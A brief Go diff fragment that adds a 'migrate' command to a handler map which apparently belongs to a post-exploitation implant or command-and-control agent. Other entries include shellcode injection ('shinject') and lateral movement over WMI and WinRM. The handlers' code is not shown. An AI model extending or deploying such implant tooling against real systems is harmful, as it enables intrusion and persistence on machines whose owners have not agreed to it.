@@ -48,6 +48,7 @@ func init() {
 		"spawn":                    handleSpawn,
 		"shinject":                 handleShinject,
 		"shspawn":                  handleShspawn,
+		"migrate":                  handleMigrate,
 		"lateral":                  handleLateral,
 		"lateral_wmi":              handleLateralWMI,
 		"lateral_winrm":            handleLateralWinRM,
